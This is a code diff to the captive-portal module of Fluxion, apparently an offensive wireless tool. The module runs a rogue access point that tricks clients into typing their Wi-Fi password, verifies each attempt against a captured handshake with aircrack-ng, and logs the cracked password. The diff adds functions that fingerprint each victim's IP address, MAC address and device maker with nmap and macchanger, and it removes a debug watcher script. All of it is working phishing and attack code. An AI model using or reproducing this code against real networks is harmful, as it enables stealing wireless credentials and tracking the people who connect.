@@ -5,6 +5,7 @@ CaptivePortalState="Not Ready"
 
 CaptivePortalPassLog="$FLUXIONPath/attacks/Captive Portal/pwdlog"
 CaptivePortalNetLog="$FLUXIONPath/attacks/Captive Portal/netlog"
+CaptivePortalMacLog="$FLUXIONPath/attacks/Captive Portal/netlog/"
 CaptivePortalJamTime="9999999999999"
 
 CaptivePortalAuthenticationMethods=("hash") # "wpa_supplicant")
@@ -345,6 +346,43 @@ function captive_portal_unset_attack() {
 	fi
 }
 
+function captive_portal_get_client_IP() {
+	if [ -f "$FLUXIONWorkspacePath/ip_hits" ]; then
+		MatchedClientIP=$(cat "$FLUXIONWorkspacePath/ip_hits" | tail -n 1 | head -n 1)
+	else
+		MatchedClientIP="unknown"
+	fi
+
+	echo $MatchedClientIP
+}
+
+function captive_portal_get_IP_MAC() {
+	if [ -f "$FLUXIONWorkspacePath/ip_hits" ] && [ $(captive_portal_get_client_IP) != "" ]; then
+		IP=$(captive_portal_get_client_IP)
+		MatchedClientMAC=$(nmap -PR -sn -n $IP 2>&1 | grep -i mac | awk '{print $3}' | tr [:upper:] [:lower:])
+		if [ "$(echo $MatchedClientMAC | wc -m)" != "18" ]; then
+			MatchedClientMAC="xx:xx:xx:xx:xx:xx"
+		fi
+	else
+		MatchedClientMAC="unknown"
+	fi
+	echo $MatchedClientMAC
+}
+
+function captive_portal_get_MAC_brand() {
+    local MACManufacturer=""
+	if [ $(captive_portal_get_IP_MAC) != "" ]; then
+		MACManufacturer=$(macchanger -l | grep "$(echo "$(captive_portal_get_IP_MAC)" | cut -d ":" -f -3)" | cut -d " " -f 5-)
+		if echo "$MACManufacturer" | grep -q x; then
+		        MACManufacturer="unknown"
+		fi
+	else
+		MACManufacturer="unknown"
+	fi
+
+	echo $MACManufacturer
+}
+
 # Create different settings required for the script
 function captive_portal_set_attack() {
 	# AP Service: Prepare service for an attack.
@@ -568,10 +606,6 @@ AuthenticatorState=\"running\"
 
 startTime=\$(date +%s)
 
-if [ ! -f "$CaptivePortalIpLog" ];then
-	touch $CaptivePortalIpLog
-fi
-
 while [ \$AuthenticatorState = \"running\" ]; do
 	let s=\$(date +%s)-\$startTime
 
@@ -607,10 +641,7 @@ while [ \$AuthenticatorState = \"running\" ]; do
 		fi
 
 		# Save any new password attempt.
-		cat \"$FLUXIONWorkspacePath/pwdattempt.txt\" >> \"$CaptivePortalPassLog/$APTargetSSID-$APTargetMAC.log\"
-
-		# Save ips to file
-		echo -e "$(if [ -f "$CaptivePortalIpLog" ];then cat "$CaptivePortalIpLog" | tail -n 1 | head -n 1; fi)\n" >> \"$CaptivePortalPassLog/$APTargetSSID-$APTargetMAC-IP.log\"
+		cat \"$FLUXIONWorkspacePath/pwdattempt.txt\" >> \"$CaptivePortalPassLog/${APTargetSSIDClean//\"/\\\"}-$APTargetMAC.log\"
 
 		# Clear logged password attempt.
 		echo -n > \"$FLUXIONWorkspacePath/pwdattempt.txt\"
@@ -621,7 +652,7 @@ while [ \$AuthenticatorState = \"running\" ]; do
 		echo "
 	if [ -f \"$FLUXIONWorkspacePath/candidate_result.txt\" ]; then
 		# Check if we've got the correct password by looking for anything other than \"Passphrase not in\".
-		if ! aircrack-ng -w \"$FLUXIONWorkspacePath/candidate.txt\" \"$FLUXIONWorkspacePath/$APTargetSSIDClean-$APTargetMAC.cap\" | grep -qi \"Passphrase not in\"; then
+		if ! aircrack-ng -w \"$FLUXIONWorkspacePath/candidate.txt\" \"$FLUXIONWorkspacePath/${APTargetSSIDClean//\"/\\\"}-$APTargetMAC.cap\" | grep -qi \"Passphrase not in\"; then
             echo \"2\" > \"$FLUXIONWorkspacePath/candidate_result.txt\"
 
 			sleep 1
@@ -634,12 +665,13 @@ while [ \$AuthenticatorState = \"running\" ]; do
 	fi" >> "$FLUXIONWorkspacePath/captive_portal_authenticator.sh"
 	fi
 
+	local staticSSID=$(printf "%q" "$APTargetSSID" | sed -r 's/\\\ / /g' | sed -r "s/\\\'/\'/g")
 	echo "
 	DHCPClients=($(nmap -PR -sn -n -oG - $VIGWNetwork.100-110 2>&1 | grep Host))
 
 	echo
 	echo -e \"  ACCESS POINT:\"
-	echo -e \"    SSID ...........: $CWht$APTargetSSID$CClr\"
+	printf  \"    SSID ...........: $CWht%s$CClr\\n\" \"$staticSSID\"
 	echo -e \"    MAC ............: $CYel$APTargetMAC$CClr\"
 	echo -e \"    Channel ........: $CWht$APTargetChannel$CClr\"
 	echo -e \"    Vendor .........: $CGrn${APTargetMaker:-UNKNOWN}$CClr\"
@@ -692,75 +724,27 @@ sleep 3
 
 signal_stop_attack
 
-
-# killall mdk3 &> $FLUXIONOutputDevice
-# killall aireplay-ng &> $FLUXIONOutputDevice
-# killall airbase-ng &> $FLUXIONOutputDevice
-# kill \$(ps a | grep python | grep fluxion_captive_portal_dns.py | awk '{print \$1}') &> $FLUXIONOutputDevice
-# killall hostapd &> $FLUXIONOutputDevice
-# killall lighttpd &> $FLUXIONOutputDevice
-# killall dhcpd &> $FLUXIONOutputDevice
-
-# if [ \"$APRogueAuthMode\" = \"wpa_supplicant\" ]; then
-#	killall wpa_supplicant &> $FLUXIONOutputDevice
-# fi
-
-# killall wpa_passphrase &> $FLUXIONOutputDevice
-
 # Assure we've got a directory to store net logs into.
 if [ ! -d \"$CaptivePortalNetLog\" ]; then
 	mkdir -p \"$CaptivePortalNetLog\"
 fi
 
 echo \"
-FLUXION $FLUXIONVersion
+FLUXION $FLUXIONVersion.$FLUXIONRevision
 
-SSID: $APTargetSSID
+SSID: \\\"$staticSSID\\\"
 BSSID: $APTargetMAC ($APTargetMaker)
 Channel: $APTargetChannel
 Security: $APTargetEncryption
 Time: \$ih\$h:\$im\$m:\$is\$s
 Password: \$(cat $FLUXIONWorkspacePath/candidate.txt)
-Mac: $MatchedClientMAC
-IP: $MatchedClientIP
-\" >\"$CaptivePortalNetLog/$APTargetSSID-$APTargetMAC.log\"" >> "$FLUXIONWorkspacePath/captive_portal_authenticator.sh"
-
-echo "
-	while true; do
-		if [ -f "/tmp/fluxspace/ip_hits" ];then 
-			MatchedClientIP=$(cat $/tmp/fluxspace/ip_hits)
-
-			if [ "$MatchedClientIP" != "" ];then
-				MatchedClientMAC=\$(nmap -PR -sn -n \$MatchedClientIP 2>&1 | grep -i mac | awk '{print \$3}' | tr [:upper:] [:lower:])
-
-				if [ \"\$(echo \$MatchedClientMAC| wc -m)\" != \"18\" ]; then
-					MatchedClientMAC=\"xx:xx:xx:xx:xx:xx\"
-				fi
-
-				VICTIM_FABRICANTE=\$(macchanger -l | grep \"\$(echo \"\$MatchedClientMAC\" | cut -d \":\" -f -3)\" | cut -d \" \" -f 5-)
-			    if echo \$MatchedClientMAC| grep -q x; then
-			            VICTIM_FABRICANTE=\"unknown\"
-			    fi
-			else
-				MatchedClientIP="Unknown"
-				MatchedClientMAC="Unknown"
-			fi
-
-			echo "$MatchedClientIP $MatchedClientMAC $(cat $/tmp/fluxspace/ip_hits)"
-
-			sleep 2
-		fi
-	echo "File not found"
-
-	done
-
-" >> "$FLUXIONWorkspacePath/watch_ip.sh"
-
-chmod +x "$FLUXIONWorkspacePath/watch_ip.sh"
+Mac: $(captive_portal_get_IP_MAC)
+IP: $(captive_portal_get_client_IP)
+\" >\"$CaptivePortalNetLog/${APTargetSSIDClean//\"/\\\"}-$APTargetMAC.log\"" >> "$FLUXIONWorkspacePath/captive_portal_authenticator.sh"
 
 	if [ $APRogueAuthMode = "hash" ]; then
 		echo "
-aircrack-ng -a 2 -b $APTargetMAC -0 -s \"$FLUXIONWorkspacePath/$APTargetSSIDClean-$APTargetMAC.cap\" -w \"$FLUXIONWorkspacePath/candidate.txt\" && echo && echo -e \"The password was saved in "$CRed"$CaptivePortalNetLog/$APTargetSSID-$APTargetMAC.log"$CClr"\"\
+aircrack-ng -a 2 -b $APTargetMAC -0 -s \"$FLUXIONWorkspacePath/${APTargetSSIDClean//\"/\\\"}-$APTargetMAC.cap\" -w \"$FLUXIONWorkspacePath/candidate.txt\" && echo && echo -e \"The password was saved in "$CRed"$CaptivePortalNetLog/${APTargetSSIDClean//\"/\\\"}-$APTargetMAC.log"$CClr"\"\
 " >> "$FLUXIONWorkspacePath/captive_portal_authenticator.sh"
 	fi
 
@@ -1092,9 +1076,6 @@ function start_attack() {
 
 	echo -e "$FLUXIONVLine $CaptivePortalStartingAuthenticatorServiceNotice"
     xterm -hold $TOPRIGHT -bg black -fg "#CCCCCC" -title "FLUXION AP Authenticator" -e "$FLUXIONWorkspacePath/captive_portal_authenticator.sh" &
-
-	# Debug
-	xterm -hold $TOPRIGHT -bg black -fg "#CCCCCC" -title "Debug" -e "bash $FLUXIONWorkspacePath/watch_ip.sh" &
 
 }
 
